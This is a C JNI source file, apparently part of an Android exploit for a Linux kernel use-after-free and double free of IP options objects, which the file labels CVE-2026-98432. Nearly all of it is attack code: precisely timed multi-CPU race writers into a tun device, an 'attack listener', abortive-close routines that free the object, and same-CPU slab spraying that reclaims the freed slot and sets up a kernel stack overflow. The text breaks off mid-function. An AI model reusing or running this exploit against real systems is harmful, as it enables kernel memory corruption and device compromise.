// Native helpers for the CVE-2026-98432 work.
//
// Everything here exists because the interesting interfaces are syscalls that
// the Java networking stack does not expose:
//
//   * setsockopt(IP_OPTIONS)   makes the kernel allocate an ip_options_rcu and
//                              hang it off the socket's inet_opt
//   * getsockopt(IP_OPTIONS)   reads that object back with
//                              memcpy(optbuf, &inet_opt->opt,
//                                     sizeof(struct ip_options) +
//                                     inet_opt->opt.optlen)
//                              into a fixed 56 byte stack buffer, so a tampered
//                              optlen turns the read into a stack overflow
//
// Bind failures are reported with the real errno in the returned string. The
// first attempt at building a listener just said "failed", which is not enough
// to tell EADDRINUSE from a namespace problem, and those two need completely
// different fixes.

#include <jni.h>

#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <pthread.h>
#include <time.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define IP_OPTIONS 4

// A record route option covering the whole 40 byte area.
//
// Length has to be 3 + 4n, so 39 leaves one byte for a NOP. The pointer is
// parked past the last slot so the receive path has nothing to stamp: with
// pointer <= optlen the kernel rewrites option bytes with the preferred source
// address, which would change them underneath the test.
static void fill_rr(unsigned char *buf, int len, uint32_t tag)
{
    memset(buf, 0, len);
    buf[0] = 7;             // IPOPT_RR
    buf[1] = (unsigned char)(len - 1);
    buf[2] = (unsigned char)len;
    buf[3] = (unsigned char)(tag >> 24);
    buf[4] = (unsigned char)(tag >> 16);
    buf[5] = (unsigned char)(tag >> 8);
    buf[6] = (unsigned char)(tag);
    if (len > 1) {
        buf[len - 1] = 1;   // IPOPT_NOP
    }
}

static jstring err(JNIEnv *env, const char *what, int code)
{
    char msg[192];
    snprintf(msg, sizeof(msg), "%s: %s (%d)", what, strerror(code), code);
    return (*env)->NewStringUTF(env, msg);
}

JNIEXPORT jint JNICALL
Java_com_inj_Native_applyOptions(JNIEnv *env, jclass cls, jint fd, jint tag)
{
    (void)env;
    (void)cls;

    unsigned char opts[40];
    fill_rr(opts, sizeof(opts), (uint32_t)tag);

    if (setsockopt(fd, IPPROTO_IP, IP_OPTIONS, opts, sizeof(opts)) < 0) {
        return -errno;
    }
    return 0;
}

// Read the options back. If optlen was tampered with while the object sat in a
// freed slab slot, this is where the kernel overruns its own stack buffer.
JNIEXPORT jstring JNICALL
Java_com_inj_Native_readOptions(JNIEnv *env, jclass cls, jint fd)
{
    (void)cls;

    unsigned char buf[512];
    socklen_t len = sizeof(buf);
    memset(buf, 0, sizeof(buf));

    if (getsockopt(fd, IPPROTO_IP, IP_OPTIONS, buf, &len) < 0) {
        return err(env, "getsockopt", errno);
    }

    char hex[3 * 512 + 64];
    int n = snprintf(hex, sizeof(hex), "len=%d ", (int)len);
    for (socklen_t i = 0; i < len && n < (int)sizeof(hex) - 4; i++) {
        n += snprintf(hex + n, sizeof(hex) - n, "%02x", buf[i]);
    }
    return (*env)->NewStringUTF(env, hex);
}

// Listening TCP socket on addr:port.
//
// Returns {fd, 0} on success or {-1, errno} on failure. The kernel fd is handed
// back rather than kept here because everything that matters afterwards -
// setsockopt(IP_OPTIONS), the SYN that creates a request socket, the child that
// inherits the options object - happens on this one descriptor.
JNIEXPORT jintArray JNICALL
Java_com_inj_Native_makeListener(JNIEnv *env, jclass cls, jstring addr, jint port)
{
    (void)cls;

    jint out[2];
    out[0] = -1;
    out[1] = 0;

    const char *addr_utf = (*env)->GetStringUTFChars(env, addr, NULL);

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        out[1] = errno;
        (*env)->ReleaseStringUTFChars(env, addr, addr_utf);
        jintArray r = (*env)->NewIntArray(env, 2);
        (*env)->SetIntArrayRegion(env, r, 0, 2, out);
        return r;
    }

    // Without this a listener cannot be recreated during a test run while old
    // connections are still in TIME_WAIT.
    int one = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons((uint16_t)port);
    if (inet_pton(AF_INET, addr_utf, &sa.sin_addr) != 1) {
        out[1] = EINVAL;
        close(fd);
        (*env)->ReleaseStringUTFChars(env, addr, addr_utf);
        jintArray r = (*env)->NewIntArray(env, 2);
        (*env)->SetIntArrayRegion(env, r, 0, 2, out);
        return r;
    }
    (*env)->ReleaseStringUTFChars(env, addr, addr_utf);

    if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        out[1] = errno;
        close(fd);
        jintArray r = (*env)->NewIntArray(env, 2);
        (*env)->SetIntArrayRegion(env, r, 0, 2, out);
        return r;
    }

    if (listen(fd, 128) < 0) {
        out[1] = errno;
        close(fd);
        jintArray r = (*env)->NewIntArray(env, 2);
        (*env)->SetIntArrayRegion(env, r, 0, 2, out);
        return r;
    }

    out[0] = fd;
    jintArray r = (*env)->NewIntArray(env, 2);
    (*env)->SetIntArrayRegion(env, r, 0, 2, out);
    return r;
}

// UDP socket carrying its own options object, no TCP involved.
//
// Useful as a control: if the object survives here but not on the TCP path, the
// difference is the request socket lifetime rather than the allocation itself.
JNIEXPORT jintArray JNICALL
Java_com_inj_Native_makeUdp(JNIEnv *env, jclass cls, jint tag)
{
    (void)cls;

    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        return NULL;
    }

    unsigned char opts[40];
    fill_rr(opts, sizeof(opts), (uint32_t)tag);
    if (setsockopt(fd, IPPROTO_IP, IP_OPTIONS, opts, sizeof(opts)) < 0) {
        int e = errno;
        close(fd);
        errno = e;
        return NULL;
    }

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(9999);
    sa.sin_addr.s_addr = inet_addr("10.7.7.9");
    connect(fd, (struct sockaddr *)&sa, sizeof(sa));

    jintArray out = (*env)->NewIntArray(env, 1);
    jint v = fd;
    (*env)->SetIntArrayRegion(env, out, 0, 1, &v);
    return out;
}

// Allocate many options objects with distinct tags, then read them all back.
//
// This is the detector for the double free. If inet_ehash_nolisten() failed
// and freed an ip_options_rcu that the request socket still pointed at, the
// same kmalloc-96 slot comes back twice. Two sockets then own one object, the
// second setsockopt overwrites the first one's bytes, and reading either back
// shows a tag that belongs to the other - or shows one of them twice.
//
// Every socket gets tag = index, so a clean run returns exactly one hit per
// index. Anything else means the slab handed out a duplicate slot.
JNIEXPORT jstring JNICALL
Java_com_inj_Native_probeHeap(JNIEnv *env, jclass cls, jint count)
{
    (void)cls;

    if (count < 2) {
        count = 2;
    }
    if (count > 128) {
        count = 128;
    }

    int *fds = (int *)calloc((size_t)count, sizeof(int));
    if (fds == NULL) {
        return (*env)->NewStringUTF(env, "alloc failed");
    }

    int made = 0;
    for (int i = 0; i < count; i++) {
        fds[i] = -1;

        int fd = socket(AF_INET, SOCK_DGRAM, 0);
        if (fd < 0) {
            break;
        }

        unsigned char opts[40];
        fill_rr(opts, sizeof(opts), (uint32_t)i);
        if (setsockopt(fd, IPPROTO_IP, IP_OPTIONS, opts, sizeof(opts)) < 0) {
            close(fd);
            continue;
        }

        fds[i] = fd;
        made++;
    }

    // Read every object back after all of them exist. Reading as we go would
    // miss the case where a later allocation overwrote an earlier one.
    int mismatched = 0;
    int bad_length = 0;
    int dup = 0;
    char detail[256];
    detail[0] = '\0';

    unsigned char seen[128];
    memset(seen, 0, sizeof(seen));

    for (int i = 0; i < count; i++) {
        if (fds[i] < 0) {
            continue;
        }

        unsigned char buf[64];
        socklen_t len = sizeof(buf);
        memset(buf, 0, sizeof(buf));

        if (getsockopt(fds[i], IPPROTO_IP, IP_OPTIONS, buf, &len) < 0) {
            bad_length++;
            continue;
        }

        if (len != 40) {
            bad_length++;
            if (detail[0] == '\0') {
                snprintf(detail, sizeof(detail),
                         " first anomaly: slot %d reported len=%d", i, (int)len);
            }
            continue;
        }

        // The tag sits at bytes 3..6 of the option area. Anything else means
        // these bytes do not belong to this socket.
        uint32_t tag = ((uint32_t)buf[3] << 24) | ((uint32_t)buf[4] << 16)
                     | ((uint32_t)buf[5] << 8) | (uint32_t)buf[6];

        if (tag != (uint32_t)i) {
            mismatched++;
            if (detail[0] == '\0') {
                snprintf(detail, sizeof(detail),
                         " first anomaly: slot %d holds tag %u", i, tag);
            }
        }

        if (tag < 128) {
            if (seen[tag]) {
                dup++;
                if (detail[0] == '\0') {
                    snprintf(detail, sizeof(detail),
                             " first anomaly: tag %u seen twice", tag);
                }
            }
            seen[tag] = 1;
        }
    }

    for (int i = 0; i < count; i++) {
        if (fds[i] >= 0) {
            close(fds[i]);
        }
    }
    free(fds);

    char out[512];
    snprintf(out, sizeof(out),
             "made=%d mismatched=%d badlen=%d dup=%d%s%s",
             made, mismatched, bad_length, dup,
             detail[0] ? " |" : "", detail);
    return (*env)->NewStringUTF(env, out);
}

// Pin the calling thread to one cpu.
//
// The tun receive path runs in the calling thread's softirq, so two writers
// that end up on the same cpu are serialised no matter how precisely they are
// released together: the second write cannot even start until the first one has
// returned from tcp_v4_rcv. Any test that relies on two packets racing inside
// tcp_check_req has to guarantee the writes happen on different cpus, and the
// scheduler will happily co-locate threads that are only spinning.
//
// The raw syscall is used because bionic does not export sched_getcpu() and its
// cpu_set_t handling differs between API levels.
JNIEXPORT jint JNICALL
Java_com_inj_Native_pinToCpu(JNIEnv *env, jclass cls, jint cpu)
{
    (void)env;
    (void)cls;

    long ncpu = sysconf(_SC_NPROCESSORS_ONLN);
    if (ncpu <= 0) {
        return -1;
    }
    if (cpu < 0 || cpu >= (jint)ncpu) {
        cpu = cpu % (jint)ncpu;
        if (cpu < 0) {
            cpu += (jint)ncpu;
        }
    }

    unsigned long mask = 1UL << cpu;
    long rc = syscall(__NR_sched_setaffinity, 0, sizeof(mask), &mask);
    if (rc < 0) {
        return -errno;
    }

    // Read it back so the caller can see where the thread actually landed
    // rather than where it asked to be.
    unsigned long got = 0;
    if (syscall(__NR_sched_getaffinity, 0, sizeof(got), &got) < 0) {
        return -errno;
    }

    for (int i = 0; i < (int)ncpu; i++) {
        if (got & (1UL << i)) {
            return i;
        }
    }
    return -1;
}

// Report which cpu the calling thread is currently on.
JNIEXPORT jint JNICALL
Java_com_inj_Native_currentCpu(JNIEnv *env, jclass cls)
{
    (void)env;
    (void)cls;

    unsigned long got = 0;
    if (syscall(__NR_sched_getaffinity, 0, sizeof(got), &got) < 0) {
        return -errno;
    }

    long ncpu = sysconf(_SC_NPROCESSORS_ONLN);
    if (ncpu <= 0) {
        return -1;
    }

    // With affinity pinned to a single cpu this reports that cpu exactly.
    for (int i = 0; i < (int)ncpu; i++) {
        if (got & (1UL << i)) {
            return i;
        }
    }
    return -1;
}

// ---------------------------------------------------------------------------
// Native race writers.
//
// The whole point of moving these into C is latency. A Java thread that leaves
// a spin loop still has to return through the JNI frame, go through
// FileOutputStream, enter the syscall and only then reach tun_get_user. That
// chain costs microseconds, while the window inside tcp_v4_syn_recv_sock -
// between reading ireq->ireq_opt and removing the request socket from the ehash
// - is a few hundred nanoseconds. The race can never be won from Java because
// the spread between the writers is an order of magnitude larger than the
// window they are supposed to fall into.
//
// Here each writer sits in a bare spin on a generation counter and issues
// write() the moment it changes. Four threads on four cpus leave their loop
// within a cache line transfer of each other.
// ---------------------------------------------------------------------------

#define RACE_MAX 8

struct race_state {
    int fd;
    int count;
    int stop;

    // Kept on their own cache lines. Writers bump done constantly while the
    // publisher polls it, so sharing a line with target would make every
    // completion invalidate the line the spinners are reading.
    volatile int target __attribute__((aligned(64)));
    volatile int done __attribute__((aligned(64)));

    unsigned char buf[RACE_MAX][256] __attribute__((aligned(64)));
    int buflen[RACE_MAX];

    // Timestamp taken immediately before each writer calls write(), and the
    // spread of one round: max - min. If this comes out in the microseconds,
    // the window inside tcp_v4_syn_recv_sock can never be hit no matter how the
    // rest of the test is arranged, and the honest answer is to stop chasing it.
    uint64_t fire_ns[RACE_MAX];
};

static volatile uint64_t g_last_spread;
static volatile uint64_t g_min_spread = ~0ULL;
static volatile uint64_t g_max_spread;

static struct race_state g_race;
static pthread_t g_race_threads[RACE_MAX];
static int g_race_started;

static inline uint64_t race_now_ns(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
}

static void *race_thread(void *arg)
{
    int slot = (int)(intptr_t)arg;

    // One cpu per writer, starting at 1 so cpu 0 - which carries most of the
    // system work on this device - is left alone. If the device has fewer cpus
    // than writers, wrap around instead of asking for a core that does not
    // exist, which would silently leave the thread unpinned.
    {
        long ncpu = sysconf(_SC_NPROCESSORS_ONLN);
        int want = 1 + slot;
        if (ncpu > 1) {
            want = 1 + (slot % (int)(ncpu - 1));
        }
        unsigned long mask = 1UL << want;
        syscall(__NR_sched_setaffinity, 0, sizeof(mask), &mask);
    }

    int seen = 0;
    while (!g_race.stop) {
        while (g_race.target == seen && !g_race.stop) {
            __asm__ __volatile__("yield" ::: "memory");
        }
        if (g_race.stop) {
            break;
        }

        seen = g_race.target;

        int idx = slot;
        int n = g_race.buflen[idx];
        if (n > 0) {
            // Stamped as late as possible: this is the moment the thread entered
            // the syscall, which is what decides whether it can overlap another
            // cpu's copy of the same segment.
            g_race.fire_ns[idx] = race_now_ns();

            ssize_t rc = write(g_race.fd, g_race.buf[idx], (size_t)n);
            (void)rc;
        }

        __sync_fetch_and_add(&g_race.done, 1);
    }

    return NULL;
}

JNIEXPORT jint JNICALL
Java_com_inj_Native_raceStart(JNIEnv *env, jclass cls, jint fd, jint count)
{
    int i;

    (void)env;
    (void)cls;

    if (g_race_started) {
        return 0;
    }
    if (count < 2) {
        count = 2;
    }
    if (count > RACE_MAX) {
        count = RACE_MAX;
    }

    memset(&g_race, 0, sizeof(g_race));
    g_race.fd = fd;
    g_race.count = count;
    g_race.stop = 0;

    for (i = 0; i < count; i++) {
        if (pthread_create(&g_race_threads[i], NULL, race_thread,
                           (void *)(intptr_t)i) != 0) {
            g_race.stop = 1;
            return -1;
        }
    }

    g_race_started = 1;
    return count;
}

// Publish a pair of packets to all race writers and wait until every one of
// them has issued its write.
JNIEXPORT jint JNICALL
Java_com_inj_Native_raceFire(JNIEnv *env, jclass cls, jbyteArray a, jbyteArray b)
{
    jsize la, lb;
    unsigned long long spins;

    (void)cls;

    if (!g_race_started) {
        return -1;
    }

    la = (*env)->GetArrayLength(env, a);
    lb = (*env)->GetArrayLength(env, b);
    if (la > (jsize)sizeof(g_race.buf[0]) || lb > (jsize)sizeof(g_race.buf[0])) {
        return -2;
    }

    // Fill every other slot with the same two payloads. All writers race, and
    // getting two of them through the window is what matters - which two is up
    // to the scheduler.
    {
        int i;
        for (i = 0; i < g_race.count; i++) {
            if ((i & 1) == 0) {
                (*env)->GetByteArrayRegion(env, a, 0, la, (jbyte *)g_race.buf[i]);
                g_race.buflen[i] = (int)la;
            } else {
                (*env)->GetByteArrayRegion(env, b, 0, lb, (jbyte *)g_race.buf[i]);
                g_race.buflen[i] = (int)lb;
            }
        }
    }

    g_race.done = 0;
    __sync_synchronize();

    // One store releases every spinner at once.
    g_race.target++;

    for (spins = 0; g_race.done < g_race.count; spins++) {
        if (spins > 400000000ULL) {
            return -3;
        }
    }

    // How far apart the writers actually were. This is the number that decides
    // whether the race is reachable at all, so it is measured rather than
    // assumed.
    {
        uint64_t lo = ~0ULL;
        uint64_t hi = 0;
        int i;
        for (i = 0; i < g_race.count; i++) {
            uint64_t t = g_race.fire_ns[i];
            if (t == 0) {
                continue;
            }
            if (t < lo) {
                lo = t;
            }
            if (t > hi) {
                hi = t;
            }
        }
        if (hi > lo) {
            uint64_t spread = hi - lo;
            g_last_spread = spread;
            if (spread < g_min_spread) {
                g_min_spread = spread;
            }
            if (spread > g_max_spread) {
                g_max_spread = spread;
            }
        }
    }

    return g_race.count;
}

// Last, smallest and largest observed spread between the first and last writer
// entering write(), in nanoseconds.
JNIEXPORT jlongArray JNICALL
Java_com_inj_Native_raceSpread(JNIEnv *env, jclass cls)
{
    jlong out[3];

    (void)cls;

    out[0] = (jlong)g_last_spread;
    out[1] = (g_min_spread == ~0ULL) ? -1 : (jlong)g_min_spread;
    out[2] = (jlong)g_max_spread;

    {
        jlongArray arr = (*env)->NewLongArray(env, 3);
        (*env)->SetLongArrayRegion(env, arr, 0, 3, out);
        return arr;
    }
}

JNIEXPORT void JNICALL
Java_com_inj_Native_raceStop(JNIEnv *env, jclass cls)
{
    (void)env;
    (void)cls;

    if (!g_race_started) {
        return;
    }

    g_race.stop = 1;
    g_race.target++;

    for (int i = 0; i < g_race.count; i++) {
        pthread_join(g_race_threads[i], NULL);
    }

    g_race_started = 0;
}

// Accept one connection on an already listening fd.
//
// Needed because the attack listener is created here and never handed to a
// java.net.ServerSocket, so nothing in the Java layer can accept on it. Without
// an accept loop the children pile up until the queue is full and later SYNs
// are dropped - and, more importantly, the accepted child is exactly where a
// dangling inet_opt would be observable.
JNIEXPORT jint JNICALL
Java_com_inj_Native_acceptFd(JNIEnv *env, jclass cls, jint fd)
{
    (void)env;
    (void)cls;

    int conn = accept(fd, NULL, NULL);
    if (conn < 0) {
        return -errno;
    }
    return conn;
}

// Accept and immediately close children, with nothing in between.
//
// The only thing that ever frees the options object is inet_sock_destruct()
// running for the child, and the only trigger we control is closing that
// child. Everything this loop does after accept() therefore sits directly on
// top of the race: the kernel builds a SYNACK for a retransmitted SYN while we
// are closing the socket that owns the same ip_options_rcu. Reading the
// options, formatting a string and handing the fd to the ring all added
// microseconds of jitter to that moment, which is far more than the window the
// kernel leaves open, so they are gone from this path.
JNIEXPORT jlong JNICALL
Java_com_inj_Native_acceptClose(JNIEnv *env, jclass cls, jint fd, jint count)
{
    long done = 0;
    int i;
    (void)env;
    (void)cls;

    for (i = 0; i < count; i++) {
        int conn = accept(fd, NULL, NULL);
        if (conn < 0) {
            if (errno == EINTR) {
                continue;
            }
            break;
        }
        close(conn);
        done++;
    }
    return done;
}
// SRTT decimator: accept one child and immediately RST it, with SO_LINGER 0.
//
// SO_LINGER with a zero timeout turns close() into an abortive release: the
// kernel sends RST and runs inet_sock_destruct() synchronously inside the
// close() syscall, on the cpu that runs this thread. The child - and therefore
// the one ip_options_rcu object that the request socket handed over - is freed
// the moment close() returns, no deferred work, no RCU, no softirq hop.
//
// The sequencing matters: ack1-style workloads free each options object once
// and then the address goes quiet, which is exactly why that mode showed ~1
// orphan per round while its object lived on. By re-opening with the same
// address, port and ISN every round, the retransmitted SYN of round N keeps
// colliding with the close of round N-1's child instead.
JNIEXPORT jlong JNICALL
Java_com_inj_Native_rstSrtt(JNIEnv *env, jclass cls, jint fd, jint rounds)
{
    long done = 0;
    int i;
    (void)env;
    (void)cls;

    for (i = 0; i < rounds; i++) {
        struct linger lg;
        int conn = accept(fd, NULL, NULL);
        if (conn < 0) {
            if (errno == EINTR) {
                continue;
            }
            break;
        }
        lg.l_onoff = 1;
        lg.l_linger = 0;
        setsockopt(conn, SOL_SOCKET, SO_LINGER, &lg, sizeof(lg));
        close(conn);
        done++;
    }
    return done;
}
JNIEXPORT jlong JNICALL
Java_com_inj_Native_rstSpin(JNIEnv *env, jclass cls, jint fd, jint ms)
{
    struct timespec ts0, ts;
    long done = 0;
    (void)env;
    (void)cls;

    clock_gettime(CLOCK_MONOTONIC, &ts0);
    for (;;) {
        int conn = accept4(fd, NULL, NULL, SOCK_NONBLOCK);
        if (conn >= 0) {
            struct linger lg;
            lg.l_onoff = 1;
            lg.l_linger = 0;
            setsockopt(conn, SOL_SOCKET, SO_LINGER, &lg, sizeof lg);
            close(conn);
            done++;
            continue;
        }
        if (errno != EAGAIN && errno != EWOULDBLOCK) {
            break;
        }
        clock_gettime(CLOCK_MONOTONIC, &ts);
        if ((ts.tv_sec - ts0.tv_sec) * 1000L
                + (ts.tv_nsec - ts0.tv_nsec) / 1000000L >= ms) {
            break;
        }
    }
    return done;
}
// Same-core slab pressure.
//
// SLUB keeps one freelist per cpu, and it is LIFO: an object freed on cpu N is
// handed back to the very next kmalloc on cpu N. The window between the free
// of the options object (close on the accept thread) and the last dereference
// in ip_options_build is a few microseconds wide, so a replacement object must
// be allocated within that time - and on the *same cpu* as the free, or the
// per-cpu freelists never meet.
//
// This thread pins itself to one cpu and hammers setsockopt(IP_OPTIONS) /
// getsockopt / close. Every cycle allocates one ip_options_rcu and frees it.
// Running it pinned to the accept thread's cpu turns the freed slot into the
// head of the freelist exactly when the racing SYNACK is mid-build.
JNIEXPORT jlong JNICALL
Java_com_inj_Native_spraySameCpu(JNIEnv *env, jclass cls, jint cpu, jint ms)
{
    struct timespec ts0, ts;
    long cycles = 0;
    unsigned char buf[128];
    socklen_t len;
    (void)env;
    (void)cls;

    long ncpu = sysconf(_SC_NPROCESSORS_ONLN);
    if (ncpu <= 0 || cpu < 0 || cpu >= (jint)ncpu) {
        return -1;
    }
    unsigned long mask = 1UL << cpu;
    if (syscall(__NR_sched_setaffinity, 0, sizeof mask, &mask) < 0) {
        return -errno;
    }

    clock_gettime(CLOCK_MONOTONIC, &ts0);
    for (;;) {
        int s = socket(AF_INET, SOCK_DGRAM, 0);
        if (s < 0) {
            break;
        }
        unsigned char opt[40];
        memset(opt, 0x01, sizeof opt);
        opt[0] = 7;             /* IPOPT_RR */
        opt[1] = 39;            /* length */
        opt[2] = 40;            /* pointer, past the end: no in-place edits */
        opt[39] = 0x01;         /* NOP */
        if (setsockopt(s, IPPROTO_IP, IP_OPTIONS, opt, 40) == 0) {
            len = sizeof buf;
            getsockopt(s, IPPROTO_IP, IP_OPTIONS, buf, &len);
        }
        cycles++;
        close(s);
        clock_gettime(CLOCK_MONOTONIC, &ts);
        long elapsed = (ts.tv_sec - ts0.tv_sec) * 1000000L
                + (ts.tv_nsec - ts0.tv_nsec) / 1000L;
        if (elapsed >= (long)ms * 1000L) {
            break;
        }
    }
    return cycles;
}
// Accept, free, and immediately claim the slot back on the same cpu.
//
// The observable part of this bug is not the free, it is the reuse. kfree only
// writes a free pointer at offset 0 of the object, and the fields
// ip_options_build reads (optlen at offset 24, the option bytes from 32 on)
// are untouched - so a read of freed memory returns exactly the old bytes and
// the SYNACK looks perfectly normal. The only way a use-after-free shows up on
// the wire is if a *different* object is allocated into that slot after the
// free and before the reader copies it out.
//
// SLUB hands a freed object to the next allocation on the *same* cpu, LIFO. So
// the free and the claim have to happen back to back on one cpu: close() runs
// inet_sock_destruct() and frees the options object synchronously, and the
// setsockopt two lines later takes that same slot and fills it with 24 bytes
// of options. A SYNACK built from that memory now reports a 24 byte option
// area instead of the 8 the connection was opened with, which is visible.
JNIEXPORT jlong JNICALL
Java_com_inj_Native_recycleSpin(JNIEnv *env, jclass cls, jint fd, jint cpu, jint ms)
{
    struct timespec ts0, ts;
    long done = 0;
    unsigned char opt[24];
    (void)env;
    (void)cls;

    long ncpu = sysconf(_SC_NPROCESSORS_ONLN);
    if (ncpu <= 0) {
        return -1;
    }
    if (cpu < 0 || cpu >= (jint)ncpu) {
        cpu = (jint)(ncpu - 1);
    }
    unsigned long mask = 1UL << cpu;
    if (syscall(__NR_sched_setaffinity, 0, sizeof mask, &mask) < 0) {
        return -errno;
    }

    memset(opt, 0x01, sizeof opt);
    opt[0] = 7;              /* IPOPT_RR */
    opt[1] = 23;             /* length 3 + 4n */
    opt[2] = 24;             /* pointer past the end */
    opt[3] = 0x52;           /* marker the SYNACK will carry if this wins */
    opt[4] = 0x45;
    opt[5] = 0x43;
    opt[6] = 0x59;
    opt[7] = 0x01;

    clock_gettime(CLOCK_MONOTONIC, &ts0);
    for (;;) {
        int conn = accept4(fd, NULL, NULL, SOCK_NONBLOCK);
        if (conn >= 0) {
            struct linger lg;
            lg.l_onoff = 1;
            lg.l_linger = 0;
            setsockopt(conn, SOL_SOCKET, SO_LINGER, &lg, sizeof lg);

            /* frees inet_opt on this cpu, inside the syscall */
            close(conn);

            /* take the slot straight back before anything else can */
            int s = socket(AF_INET, SOCK_DGRAM, 0);
            if (s >= 0) {
                setsockopt(s, IPPROTO_IP, IP_OPTIONS, opt, sizeof opt);
                close(s);
            }
            done++;
            continue;
        }
        if (errno != EAGAIN && errno != EWOULDBLOCK) {
            break;
        }
        clock_gettime(CLOCK_MONOTONIC, &ts);
        if ((ts.tv_sec - ts0.tv_sec) * 1000L
                + (ts.tv_nsec - ts0.tv_nsec) / 1000000L >= ms) {
            break;
        }
    }
    return done;
}
// Two writes with a calibrated gap between them.
//
// The order matters and so does the spacing. The ACK has to run far enough
// ahead that its child is queued, closed and its options object already
// recycled into a fresh allocation before the retransmitted SYN reaches
// ip_options_build - otherwise the copy happens first and reads perfectly
// ordinary memory. A few microseconds is the whole difference.
JNIEXPORT jint JNICALL
Java_com_inj_Native_duoDelay(JNIEnv *env, jclass cls, jint fd,
                             jbyteArray a, jint aLen,
                             jbyteArray b, jint bLen, jint delayNs)
{
    struct timespec ts0, ts;
    jbyte *pa, *pb;
    (void)env;
    (void)cls;

    if (aLen <= 0 || aLen > 4096 || bLen <= 0 || bLen > 4096) {
        return -1;
    }
    pa = (*env)->GetByteArrayElements(env, a, NULL);
    pb = (*env)->GetByteArrayElements(env, b, NULL);
    if (pa == NULL || pb == NULL) {
        if (pa) (*env)->ReleaseByteArrayElements(env, a, pa, JNI_ABORT);
        if (pb) (*env)->ReleaseByteArrayElements(env, b, pb, JNI_ABORT);
        return -2;
    }

    if (write(fd, pa, (size_t) aLen) != (ssize_t) aLen) {
        (*env)->ReleaseByteArrayElements(env, a, pa, JNI_ABORT);
        (*env)->ReleaseByteArrayElements(env, b, pb, JNI_ABORT);
        return -3;
    }

    if (delayNs > 0) {
        clock_gettime(CLOCK_MONOTONIC, &ts0);
        for (;;) {
            clock_gettime(CLOCK_MONOTONIC, &ts);
            long el = (ts.tv_sec - ts0.tv_sec) * 1000000000L
                    + (ts.tv_nsec - ts0.tv_nsec);
            if (el >= (long) delayNs) {
                break;
            }
        }
    }

    if (write(fd, pb, (size_t) bLen) != (ssize_t) bLen) {
        (*env)->ReleaseByteArrayElements(env, a, pa, JNI_ABORT);
        (*env)->ReleaseByteArrayElements(env, b, pb, JNI_ABORT);
        return -4;
    }

    (*env)->ReleaseByteArrayElements(env, a, pa, JNI_ABORT);
    (*env)->ReleaseByteArrayElements(env, b, pb, JNI_ABORT);
    return 0;
}
// Look for a duplicated slab slot.
//
// Freeing the same ip_options_rcu twice leaves the pointer in the kmalloc-96
// freelist twice, so two later allocations hand out the same address. Each
// socket here keeps its own IP_OPTIONS object alive with a unique marker
// stamped inside it; if two of them share memory, setting the second one
// overwrites the first and the readback no longer matches what was written.
//
// This is the whole point: it turns an invisible use-after-free into a
// user-space observable, without needing to see a single SYNACK.
JNIEXPORT jint JNICALL
Java_com_inj_Native_dupProbe(JNIEnv *env, jclass cls, jint count, jint tag)
{
    int *fds;
    int i, found = 0;
    unsigned char opt[24];
    unsigned char back[64];
    (void)env;
    (void)cls;

    if (count <= 0 || count > 4096) {
        return -1;
    }
    fds = (int *) calloc((size_t) count, sizeof(int));
    if (!fds) {
        return -2;
    }

    memset(opt, 0x01, sizeof opt);
    opt[0] = 7;
    opt[1] = 23;
    opt[2] = 24;

    for (i = 0; i < count; i++) {
        fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (fds[i] < 0) {
            count = i;
            break;
        }
        opt[3] = (unsigned char) (tag >> 24);
        opt[4] = (unsigned char) (tag >> 16);
        opt[5] = (unsigned char) (tag >> 8);
        opt[6] = (unsigned char) tag;
        opt[7] = (unsigned char) i;
        setsockopt(fds[i], IPPROTO_IP, IP_OPTIONS, opt, sizeof opt);
    }

    for (i = 0; i < count; i++) {
        socklen_t len = sizeof back;
        if (fds[i] < 0) {
            continue;
        }
        memset(back, 0xEE, sizeof back);
        if (getsockopt(fds[i], IPPROTO_IP, IP_OPTIONS, back, &len) < 0) {
            continue;
        }
        if (len < 8) {
            continue;
        }
        /* The low byte has to be our index; anything else means another
         * socket's object was written over this one. */
        if (back[3] != (unsigned char) (tag >> 24) || back[7] != (unsigned char) i) {
            found++;
        }
    }

    for (i = 0; i < count; i++) {
        if (fds[i] >= 0) {
            close(fds[i]);
        }
    }
    free(fds);
    return found;
}
// Fire two packets from two cpus at the same instant.
//
// Two java threads spinning on a volatile field release each other hundreds of
// microseconds apart - measured, not guessed - and the window where both can be
// inside tcp_check_req for the same request socket is only a few microseconds.
// So the rendezvous has to happen below the jvm: both writers park on one
// atomic word here, the caller flips it once, and they leave within a hundred
// nanoseconds of each other, each on its own cpu.
typedef struct {
    int fd;
    const unsigned char *pkt;
    int len;
    int cpu;
    volatile int *go;
    int errno_seen;
    int wrote;
} duo_arg;

static void *duo_worker(void *arg)
{
    duo_arg *a = (duo_arg *) arg;
    int spin;

    if (a->cpu > 0) {
        /* Pinning is optional: a spinning writer on the same core starves the
         * softirq that has to drain the tunnel afterwards. */
        unsigned long mask = 1UL << a->cpu;
        syscall(__NR_sched_setaffinity, 0, sizeof mask, &mask);
    }

    /* Park until the caller releases both writers. */
    for (spin = 0; !*a->go && spin < 200000000; spin++) {
        __sync_synchronize();
    }
    a->wrote = (int) write(a->fd, a->pkt, (size_t) a->len);
    if (a->wrote < 0) {
        a->errno_seen = errno;
    }
    return NULL;
}

JNIEXPORT jint JNICALL
Java_com_inj_Native_dualWrite(JNIEnv *env, jclass cls, jint fd,
                              jbyteArray a, jint aLen,
                              jbyteArray b, jint bLen, jint cpuA, jint cpuB)
{
    pthread_t t1, t2;
    duo_arg arg1, arg2;
    volatile int go = 0;
    jbyte *pa, *pb;
    (void)env;
    (void)cls;

